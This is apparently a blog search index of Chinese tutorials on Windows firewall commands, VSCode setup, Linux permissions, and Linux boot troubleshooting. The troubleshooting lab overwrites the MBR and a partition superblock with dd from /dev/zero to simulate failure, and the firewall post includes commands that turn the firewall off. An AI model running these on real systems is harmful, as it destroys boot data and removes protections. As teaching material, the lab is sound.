<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>批处理之配置防火墙</title>
      <link href="/2020/12/16/pi-chu-li-zhi-pei-zhi-fang-huo-qiang/"/>
      <url>/2020/12/16/pi-chu-li-zhi-pei-zhi-fang-huo-qiang/</url>
      
        <content type="html"><![CDATA[<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p>查看当前防火墙状态：<code>netsh advfirewall show allprofiles</code></p><p>关闭防火墙：<code>netsh advfirewall set allprofiles state off</code></p><p>开启防火墙：<code>netsh advfirewall set allprofiles state on</code></p><p>恢复初始防火墙设置：<code>netsh advfirewall reset</code></p><p>设置默认输入和输出策略：<code>netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound</code></p><p>以上是设置为允许，如果设置为拒绝使用<code>blockinbound,blockoutbound</code></p><h1 id="常用参数解释"><a href="#常用参数解释" class="headerlink" title="常用参数解释"></a>常用参数解释</h1><pre class=" language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 必备参数，指定进站方向还是出站方向</span><span class="token function">dir</span>=in<span class="token punctuation">|</span>out<span class="token comment" spellcheck="true"># 必备参数，设定这个规则是允许还是阻断或者是跳过</span>action=allow<span class="token punctuation">|</span>block<span class="token punctuation">|</span>bypass<span class="token comment" spellcheck="true"># 可选参数，为某应用程序设定规则</span><span class="token namespace">[program=&lt;program path>]</span><span class="token comment" spellcheck="true"># 可选参数，为某系统服务设定规则</span><span class="token namespace">[service=&lt;service short name>|any]</span><span class="token comment" spellcheck="true"># 可选参数，为这个规则加一个说明描述</span><span class="token namespace">[description=&lt;string>]</span><span class="token comment" spellcheck="true"># 可选参数，指定本端IP地址</span><span class="token namespace">[localip=any|&lt;IPv4 address>|&lt;IPv6 address>|&lt;subnet>|&lt;range>|&lt;list>]</span><span class="token comment" spellcheck="true"># 可选参数，指定远端IP地址</span><span class="token namespace">[remoteip=any|localsubnet|dns|dhcp|wins|defaultgateway|&lt;IPv4 address>|&lt;IPv6 address>|&lt;subnet>|&lt;range>|&lt;list>]</span><span class="token comment" spellcheck="true"># 可选参数，指定本端端口号，默认为所有端口</span><span class="token namespace">[localport=0-65535|&lt;port range>[,...]</span><span class="token punctuation">|</span>RPC<span class="token punctuation">|</span>RPC<span class="token operator">-</span>EPMap<span class="token punctuation">|</span>IPHTTPS<span class="token punctuation">|</span>any <span class="token punctuation">(</span>default=any<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 可选参数，指定远端端口号，默认为所有端口</span><span class="token namespace">[remoteport=0-65535|&lt;port range>[,...]</span><span class="token punctuation">|</span>any <span class="token punctuation">(</span>default=any<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 可选参数，指定协议类型，默认为所有协议</span><span class="token namespace">[protocol=0-255|icmpv4|icmpv6|icmpv4:type,code|icmpv6:type,code|tcp|udp|any (default=any)]</span><span class="token comment" spellcheck="true"># 可选参数，指定接口类型</span><span class="token namespace">[interfacetype=wireless|lan|ras|any]</span><span class="token comment" spellcheck="true"># 可选参数，指定加密访问方式</span><span class="token namespace">[security=authenticate|authenc|authdynenc|authnoencap|notrequired(default=notrequired)]</span><span class="token comment" spellcheck="true"># 显示命令列表</span>help </code></pre><h1 id="命令使用示例"><a href="#命令使用示例" class="headerlink" title="命令使用示例"></a>命令使用示例</h1><ul><li><p>添加一条规则：</p><p><code>netsh advfirewall firewall add rule name=RDP dir=in action=allow protocol=tcp localport=3389</code></p></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Batch/firewall/添加规则.png" alt="添加规则"></center><p>该命令的含义为防火墙入添加一条规则，规则名字：RDP，协议TCP，动作为允许，端口号3389；简而言之，就是允许其他机器远程桌面连接本机：  </p><ul><li><p>删除一条规则：</p><p><code>netsh advfirewall firewall delete rule name=RDP dir=in</code></p></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Batch/firewall/删除规则.png" alt="删除规则"></center><p>直接引用上面的添加策略的命令，把add改成delete就也行,如下 <code>netsh advfirewall firewall delete rule name=RDP dir=in action=allow protocol=tcp localport=3389</code></p>]]></content>
      
      
      <categories>
          
          <category> 批处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSCode之开发环境搭建</title>
      <link href="/2020/12/14/vscode-zhi-kai-fa-huan-jing-da-jian/"/>
      <url>/2020/12/14/vscode-zhi-kai-fa-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="VSCode"><a href="#VSCode" class="headerlink" title="VSCode"></a>VSCode</h1><p>​        VSCode是微软开发的一款轻量级、开源代码编辑器，可以使用其进行各项前端程序的开发和调试。</p><h1 id="VSCode下载与安装"><a href="#VSCode下载与安装" class="headerlink" title="VSCode下载与安装"></a>VSCode下载与安装</h1><h1 id="VSCode常用快捷键"><a href="#VSCode常用快捷键" class="headerlink" title="VSCode常用快捷键"></a>VSCode常用快捷键</h1><ul><li><p><code>Ctrl + F</code>：查找和替换</p></li><li><p><code>Ctrl + S</code>：保存</p></li><li></li><li></li><li><p><code>Shift + Alt + ⬆</code>：向上复制当前行</p></li><li><p><code>Shift + Alt + ⬇</code>：向下复制当前行</p></li><li></li><li><p><code>! + Enter</code>：快速生称<code>html</code>代码框架（<a href="#htmltemplate">自定义HTML代码框架</a>）</p></li><li></li><li></li><li><p><code>Shift+Alt+F</code>：格式化代码</p></li><li></li></ul><h1 id="VSCode基础配置"><a href="#VSCode基础配置" class="headerlink" title="VSCode基础配置"></a>VSCode基础配置</h1><h2 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h2><p>​        VSCode这款软件对中文使用这非常友好，我们可以通过安装<code>Chinese (Simplified) Language</code>插件的方式实现软件的汉化。</p><ol><li><p>打开VSCode插件商城。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/VSCode插件商城.png" alt="VSCode插件商城"></center></li><li><p>在输入框中输入<code>Chinese (Simplified) Language</code>，回车搜索找到【Chinese (Simplified) Language】插件，点击<code>install</code>按钮安装即可，安装完成之后显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/汉化插件安装.png" alt="汉化插件安装"></center></li><li><p>安装完成之后，重启VSCode，即可看到汉化版的VSCode。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/VSCode汉化.png" alt="VSCode汉化"></center></li></ol><h2 id="图标美化"><a href="#图标美化" class="headerlink" title="图标美化"></a>图标美化</h2><ol><li><p>打开VSCode插件商城。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/VSCode插件商城.png" alt="VSCode插件商城"></center></li><li><p>在输入框中输入<code>vscode-icons</code>，回车搜索找到【vscode-icons】插件，点击<code>install</code>按钮安装即可，安装完成之后显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/vscode-icons安装.png" alt="vscode-icons安装"></center></li><li><p>安装完成之后，按<kbd>Ctrl+,</kbd>组合键打开设置界面，在搜索栏中输入<code>Icon Theme</code>，将其属性值设置为<code>VSCode Icons</code>即可。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/设置IconTheme.png" alt="设置IconTheme"></center></li></ol><h1 id="搭建网站开发环境"><a href="#搭建网站开发环境" class="headerlink" title="搭建网站开发环境"></a>搭建网站开发环境</h1><h2 id="在浏览器中打开"><a href="#在浏览器中打开" class="headerlink" title="在浏览器中打开"></a>在浏览器中打开</h2><ol><li><p>打开VSCode插件商城。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/VSCode插件商城.png" alt="VSCode插件商城"></center></li><li><p>在输入框中输入<code>open in browser</code>，回车搜索找到【open in browser】插件，点击<code>install</code>按钮安装即可，安装完成之后显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/open-in-browser安装.png" alt="open-in-browser安装"></center></li><li><p>安装完成之后，重启VSCode，打开一个HTML文件，右键鼠标，弹出的菜单栏中会出现“<code>Open In Defualt Browser</code>” 和“ <code>Open In Other Browsers</code>”两个选项。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/open-in-browser选项.png" alt="open-in-browser选项"></center></li><li><p>将默认浏览器改为Chrome浏览器。按<kbd>Ctrl+,</kbd>组合键打开设置界面，在搜索栏中输入<code>open-in-browser.default</code>，在编辑框中输入<code>Chrome</code>，重启VSCode即可。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/open-in-browser修改默认浏览器.png" alt="open-in-browser修改默认浏览器"></center></li></ol><h2 id="实时刷新浏览器"><a href="#实时刷新浏览器" class="headerlink" title="实时刷新浏览器"></a>实时刷新浏览器</h2><ol><li><p>打开VSCode插件商城。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/VSCode插件商城.png" alt="VSCode插件商城"></center></li><li><p>在输入框中输入<code>Live Server</code>，回车搜索找到【Live Server】插件，点击<code>install</code>按钮安装即可，安装完成之后显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/LiveServer安装.png" alt="LiveServer安装"></center></li><li><p>安装完成之后，重启VSCode，打开一个HTML文件，右键鼠标，弹出的菜单栏中会出现“<code>Open with Live Server</code>” 和“ <code>Stop Live Server</code>”两个选项。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VSCode/LiveServer选项.png" alt="LiveServer选项"></center></li></ol><p><a name="htmltemplate"></a></p><h2 id="快速填充HTML架构"><a href="#快速填充HTML架构" class="headerlink" title="快速填充HTML架构"></a>快速填充HTML架构</h2><p>​        默认情况下键入<kbd>!</kbd>后按下<kbd>Enter</kbd>或<kbd>Tab</kbd>键可以直接填充部分HTML框架代码，但是这个默认框架不能满足所有所有要求。<code>html.json</code>文件中可以编写一些与HTML相关的代码片段，然后使用定义的模板快捷键可以快速填充代码段。因此可以借助<code>html.json</code>文件来实现快速填充HTML框架的功能。</p><ol><li><p>按下<kbd>Ctrl</kbd> + <kbd>P</kbd>组合键打开文件搜索框，在输入框中输入<code>html.json</code>后按下<kbd>Enter</kbd>后将打开<code>html.json</code>文件。</p></li><li><p>按照指定的格式编写HTML的代码片段，如下所示为常用HTML框架编码。</p><pre class=" language-html"><code class="language-html">"html framework": {    "prefix": "!hf",    "body": [            "<span class="token doctype">&lt;!DOCTYPE html></span>",            "&lt;html lang=\"en\">",            "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>",            "\t&lt;meta charset=\"UTF-8\" />",            "\t&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />",            "\t&lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />",            "\t&lt;meta name=\"keywords\" content=\"keywords\" />",            "\t&lt;meta name=\"description\" content=\"This is a description.\" />",            "\t<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>",            "\t&lt;link rel=\"shortcut icon\" href=\"./favicon.ico\" type=\"image/x-icon\" />",            "\t&lt;script src=\"./lib/vue-2.4.0.js\"><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>",            "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>\n",            "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>",            "\t&lt;div id =\"app\"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n",            "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n",            "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>"    ],    "description": "html based framework"}</code></pre></li><li><p>在文件中输入<code>!hf</code>后按下<kbd>Enter</kbd>按键，将会自动填充的HTML框架。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VSCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之网络管理</title>
      <link href="/2020/12/13/linux-zhi-wang-luo-guan-li/"/>
      <url>/2020/12/13/linux-zhi-wang-luo-guan-li/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之权限管理</title>
      <link href="/2020/12/13/linux-zhi-quan-xian-guan-li/"/>
      <url>/2020/12/13/linux-zhi-quan-xian-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="权限基础"><a href="#权限基础" class="headerlink" title="权限基础"></a>权限基础</h1><h2 id="使用者与群组"><a href="#使用者与群组" class="headerlink" title="使用者与群组"></a>使用者与群组</h2><ul><li>文件拥有者：一般情况下为文件的创建者，当然<code>chown</code>命令可以修改文件或目录的所有者。</li><li>群组：是用户的容器，对组的权限设置将应用到该组中的所有成员。</li><li>其他人：这里的其他人指的是相对于属主、属组来说的，即未在组中的其他用户。</li></ul><h2 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h2><p>文件或目录权限查看及各字段意义</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/AccessControl/权限查看.png" alt="权限查看"></center><p>对权限中的各位值进行说明：</p><ul><li>第1位：指定目录或文件类型。<ul><li>当为【d】则是目录</li><li>当为【-】则是文件</li><li>当为【l】则表示为链接文件</li><li>当为【b】则表示为设备文件里面的可供存储的周边设备</li><li>当为【c】则表示为设备文件里面的序列块设备</li></ul></li><li>第2位：属主的读权限</li><li>第3位：属主的写权限</li><li>第4位：属主的执行权限</li><li>第5位：属组的读权限</li><li>第6位：属组的写权限</li><li>第7位：属组的执行权限</li><li>第8位：其他的写权限</li><li>第9位：其他的读权限</li><li>第10位：其他的执行权限</li></ul><h2 id="权限介绍"><a href="#权限介绍" class="headerlink" title="权限介绍"></a>权限介绍</h2><table><thead><tr><th align="center">权限标识</th><th align="center">数字标识</th><th align="center">文件</th><th align="center">目录</th></tr></thead><tbody><tr><td align="center">读取<code>r</code></td><td align="center">4</td><td align="center">查看文件内容复制</td><td align="center">查看目录下文件和目录名称<code>ls</code></td></tr><tr><td align="center">写入<code>w</code></td><td align="center">2</td><td align="center">修改文件内容</td><td align="center">在目录下增、删、改文件和子目录</td></tr><tr><td align="center">执行<code>x</code></td><td align="center">1</td><td align="center">可执行文件（程序或脚本）</td><td align="center">进入改目录<code>cd</code></td></tr></tbody></table><p>文件权限分为3组权限：user（属主）、group（属组）、other（其他）、all（所有人）</p><h2 id="权限的重要性"><a href="#权限的重要性" class="headerlink" title="权限的重要性"></a>权限的重要性</h2><ul><li>系统保护的功能</li><li>团队开发软件或数据共享的功能</li></ul><h1 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h1><ol><li><p>s和S的区别：如果文件本身有x权限，这个时候s；没有x权限，标识位就是S。</p></li><li><p>suid：普通用户在执行命令的一瞬间拥有了和二进制文件属主一样的权限。</p><p>权限数是：权限代码4000</p><pre class=" language-shell"><code class="language-shell">chmod  u+s   文件名   #一般用于特殊命令</code></pre></li><li><p>sgid：二进制命令——在执行命令的一瞬间拥有了和属组一样的权限。<br>目录——某个目录下的子文件会继承上级目录的属组的权限。</p><p> 权限数是：2000</p><pre class=" language-shell"><code class="language-shell">chmod  g+s   文件名   #设置sgid</code></pre></li><li><p>t粘滞位：针对共享目录，实现任何用户在该目录下可以创建和删除属于自己的文件。</p><p>权限代码是1000。 代表：/tmp</p><pre class=" language-shell"><code class="language-shell">chmod  -R  1777   /tmp  #-R表示递归修改权限，用数字设置粘滞位chmod  o+t  /tmp         #用字母方式设置粘滞位</code></pre></li></ol><h1 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h1><pre class=" language-shell"><code class="language-shell">格式1：chmod  655   1.txt    #属主rw，组rx，其他rx格式2：chmod  u=rwx  1.txt   #设置属主权限位rwx      chmod  g+x    1.txt   #给属组添加x权限       chmod  o-x    1.txt   #给其他人去掉x权限      chmod  a=rwx  1.txt   #给所有人rwx的权限说明：如果是目录，r需要x权限来配合；如果是w权限，需要r和x权限的配合。文件的修改和删除要看上层目录的写入权限。</code></pre><h1 id="修改所有者"><a href="#修改所有者" class="headerlink" title="修改所有者"></a>修改所有者</h1><ol><li><p>chown作用：修改文件的属主和属组</p></li><li><p>命令格式</p><pre class=" language-shell"><code class="language-shell">基本格式：chown   [-R] [属主：属组]  文件名chown test:test a.txt   #修改a.txt文件的属主是test，属组是testchown :root a.txt        #修改文件属组是rootchown root a.txt        #修改文件属主为root  </code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之安全加固</title>
      <link href="/2020/12/11/linux-zhi-an-quan-jia-gu/"/>
      <url>/2020/12/11/linux-zhi-an-quan-jia-gu/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之故障排除</title>
      <link href="/2020/12/11/linux-zhi-gu-zhang-pai-chu/"/>
      <url>/2020/12/11/linux-zhi-gu-zhang-pai-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="系统启动类故障"><a href="#系统启动类故障" class="headerlink" title="系统启动类故障"></a>系统启动类故障</h1><p>Linux系统的启动过程主要有如下阶段：</p><ol><li>POST加电自检</li><li>加载BIOS程序</li><li>读取MBR分区信息</li><li>加载GRUB引导程序</li><li>GRUB引导程序读取<code>/boot/grub2/grub.cfg</code>引导文件</li><li>将系统引导权交给系统初始化程序</li><li>经过一系列初始化配置后显示登录界面</li></ol><h2 id="MBR扇区故障"><a href="#MBR扇区故障" class="headerlink" title="MBR扇区故障"></a>MBR扇区故障</h2><h3 id="0x00-基础信息"><a href="#0x00-基础信息" class="headerlink" title="0x00 基础信息"></a>0x00 基础信息</h3><p><strong>MBR的重要性</strong>：</p><ul><li>MBR位于物理硬盘的第一扇区（512字节），该扇区又称为<code>主引导扇区=446字节引导程序部分+64字节分区表记录+2字节标识</code>。</li><li>主引导扇区损坏导致无法进入引导菜单，找到正确的位置无法加载系统，进入黑屏。</li></ul><p><strong>排除MBR扇区故障的步骤</strong>：</p><ol><li>添加一块新的磁盘；</li><li>在磁盘中划分分区并格式化文件系统；</li><li>将磁盘挂载到<code>/mnt</code>挂载点；</li><li>将MBR扇区数据备份到<code>/mnt</code>中；</li><li>模拟MBR扇区损坏；</li><li>从备份文件中恢复MBR扇区的数据。</li></ol><h3 id="0x01-添加备份磁盘"><a href="#0x01-添加备份磁盘" class="headerlink" title="0x01 添加备份磁盘"></a>0x01 添加备份磁盘</h3><ol><li><p>在系统中添加一块5G的硬盘，一般情况下默认的磁盘名称为<code>/dev/sdb</code>，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/添加的磁盘为sdb.png" alt="添加的磁盘为sdb"></center></li><li><p>磁盘分区。使用如下命令将sdb磁盘做成一个分区，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">fdisk /dev/sdb    # 对sdb磁盘进行分区n                # 创建分区p                # 指定创建的分区为主分区                # 分区号（默认从1开始）                # 开始字节                # 结束字节p                # 显示分区信息w                # 分区信息写入</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/创建磁盘分区.png" alt="创建磁盘分区"></center></li><li><p>磁盘格式化。使用如下命令将sdb磁盘中新建的分区格式化XFS文件系统，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">mkfs.xfs /dev/sdb1    # 将sdb1分区格式化为xfs文件系统</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/分区格式化成XFS文件系统.png" alt="分区格式化成XFS文件系统"></center></li><li><p>磁盘挂载。使用如下所示命令将sdb1分区挂载到<code>/mnt</code>目录下，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">mount /dev/sdb1 /mnt    # 将sdb1分区挂载到mnt目录下</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/挂载分区.png" alt="挂载分区"></center></li></ol><h3 id="0x02-备份MBR扇区数据"><a href="#0x02-备份MBR扇区数据" class="headerlink" title="0x02 备份MBR扇区数据"></a>0x02 备份MBR扇区数据</h3><ol><li><p>备份扇区信息。使用如下所示命令将MBR扇区数据备份到sdb1分区中，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell"># 将sda分区中的数据写入MBR.bak文件中，写入一个字节数512dd if=/dev/sda of=/mnt/MBR.bak bs=512 count=1</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/备份MBR扇区数据.png" alt="备份MBR扇区数据"></center></li><li><p>查看备份文件。查看MBR的备份文件是否存在，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/查看备份文件.png" alt="查看备份文件"></center></li></ol><h3 id="0x03-模拟MBR扇区损坏"><a href="#0x03-模拟MBR扇区损坏" class="headerlink" title="0x03 模拟MBR扇区损坏"></a>0x03 模拟MBR扇区损坏</h3><ol><li><p>模拟MBR扇区损坏。使用如下所示命令将MBR扇区的数据进行覆盖，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell"># 将sda磁盘的第一扇区的512字节填充为全0dd if=/dev/zero of=/dev/sda bs=512 count=1</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/模拟MBR扇区损坏.png" alt="模拟MBR扇区损坏"></center><p>由于MBR扇区的数据只在系统启动的时候被读取而显示系统已经启动成功，MBR中的数据被修改不会导致系统崩溃。</p></li><li><p>重启系统失败。先将CD弹出，因为引导本系统的引导顺序为：硬盘→CD→网络，若不将CD弹出会默认进入系统安装界面，显示结果如下图所示；若将CD弹出会执行网络启动，而启动失败后显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/网络引导失败.png" alt="网络引导失败"></center></li></ol><h3 id="0x04-从备份文件中恢复MBR扇区的数据"><a href="#0x04-从备份文件中恢复MBR扇区的数据" class="headerlink" title="0x04 从备份文件中恢复MBR扇区的数据"></a>0x04 从备份文件中恢复MBR扇区的数据</h3><ol><li><p>将光盘载入系统重新启动系统后，显示如下图所示界面，这里选择第三项<code>Troubleshooting</code>进入故障排除界面。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/使用光盘启动系统.png" alt="使用光盘启动系统"></center></li><li><p>故障排除界面显示如下图所示，在<code>Troubleshooting</code>界面中选择<code>Rescue a CentOS system</code>选项进入救援模式。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/RescueCentOS.png" alt="RescueCentOS"></center></li><li><p>等待一两分钟之后系统将显示如下图所示的信息，在此界面将选择进入的救援模式。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/救援模式选择.png" alt="救援模式选择"></center></li><li><p>选择<code>Continue</code>选项后将得到一个sh的shell界面，显示结果如下图所示，我们将在此shell中还原MBR分区数据。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/得到救援模式的shell.png" alt="得到救援模式的shell"></center></li><li><p>尝试查看sda的分区表信息。因为MBR分区损坏，分区表信息也丢失了所以无法查看到sda硬盘的分区信息，查询结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/尝试查看磁盘分区表.png" alt="尝试查看磁盘分区表"></center></li><li><p>挂载磁盘。使用<code>mount /dev/sdb1 /mnt</code>命令将<code>/dev/sdb1</code>重新挂载到<code>/mnt</code>，并使用命令显示分区中的MBR备份数据，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/挂载磁盘1.png" alt="挂载磁盘1"></center></li><li><p>数据MBR分区数据。使用<code>dd if=/mnt/MBR.bak of=/dev/sda</code>命令将<code>MBR.bak</code>文件中的数据写入到MBR分区中，以此来恢复MBR扇区，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/MBR分区数据还原.png" alt="MBR分区数据还原"></center></li><li><p>重启系统。键入<code>exit</code>命令后系统会自动重新启动，稍等一分钟之后进入GRUB菜单界面，显示结果如下图所示，这说明已经将MBR分区修复完成。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/MBR修复重启后进入GRUB菜单界面.png" alt="MBR修复重启后进入GRUB菜单界面"></center></li></ol><h2 id="GURB引导故障"><a href="#GURB引导故障" class="headerlink" title="GURB引导故障"></a>GURB引导故障</h2><p>​        检查完MBR分区之后将由gurb继续引导系统启动，在GURB引导过程中主要存在两种故障：GURB引导程序损坏和引导文件丢失或损坏。</p><h3 id="引导文件丢失或损坏"><a href="#引导文件丢失或损坏" class="headerlink" title="引导文件丢失或损坏"></a>引导文件丢失或损坏</h3><ol><li><p>模拟引导文件丢失或损坏。将引导文件<code>/boot/grub2/grub.cfg</code>剪切到sdb1分区的挂载点下，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/模拟引导文件丢失.png" alt="模拟引导文件丢失"></center></li><li><p>重启系统选择CD引导进入急救模式，操作步骤和上一节的步骤一样，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/光盘引导进入急救模式.gif" alt="光盘引导进入急救模式"></center><p><font color="blue">重启系统后一定要手动指定由光盘来引导，否则系统将会停留在如下图所示的界面。</font></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/grub文件缺失显示界面.png" alt="grub文件缺失显示界面"></center></li><li><p>还原<code>grub.cfg</code>配置文件的备份。使用如下所示命令将还原<code>grub.cfg</code>文件，操作过程如下图所示。</p><pre class=" language-shell"><code class="language-shell">chroot /mnt/sysimage/lsmount /dev/sdb1 /mntcd mntlscp grub.cfg.bak /boot/grub2/grub.cfgls /boot/grub2/</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/还原grub配置文件.png" alt="还原grub配置文件"></center></li><li><p>使用<code>exit</code>命令退出当前环境后会自动重启系统，稍等几分钟后系统将进入到用户登录界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/用户登录界面显示.png" alt="用户登录界面显示"></center></li></ol><h3 id="GURB引导程序损坏"><a href="#GURB引导程序损坏" class="headerlink" title="GURB引导程序损坏"></a>GURB引导程序损坏</h3><ol><li><h2 id="文件系统类故障"><a href="#文件系统类故障" class="headerlink" title="文件系统类故障"></a>文件系统类故障</h2></li></ol><h3 id="修复文件系统"><a href="#修复文件系统" class="headerlink" title="修复文件系统"></a>修复文件系统</h3><p>​        模拟文件系统故障（每个分区有个超级块，是文件系统的核心档案，记录文件系统的类型大小空间使用情况等）若超级块数据丢失则磁盘不能正常挂载。</p><h4 id="0x01-故障模拟"><a href="#0x01-故障模拟" class="headerlink" title="0x01 故障模拟"></a>0x01 故障模拟</h4><ol><li><p>使用<code>dd if=/dev/zero of=/dev/sdb1 bs=512 count=4</code>命令冲掉sdb1分区中的超级块数据信息，超级块数据被冲掉之后分区将无法正常挂载，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/冲掉超级块数据.png" alt="冲掉超级块数据"></center></li><li><p>使用<code>xfs_repair /dev/sdb1</code>命令修复sdb1分区中的超级快数据，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/超级块数据修复.png" alt="超级块数据修复"></center></li><li><p>使用<code>mount /dev/sdb1 /mnt</code>命令挂载刚刚修复的分区，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/troubleshooting/验证超级块数据是否修复成功.png" alt="验证超级块数据是否修复成功"></center></li></ol><h3 id="硬盘资源耗尽"><a href="#硬盘资源耗尽" class="headerlink" title="硬盘资源耗尽"></a>硬盘资源耗尽</h3><p>​        定期删除一些无用文件，如日志、邮件等。</p><h3 id="检测磁盘坏道"><a href="#检测磁盘坏道" class="headerlink" title="检测磁盘坏道"></a>检测磁盘坏道</h3><pre class=" language-shell"><code class="language-shell">badblocks -sv /dev/sdb</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
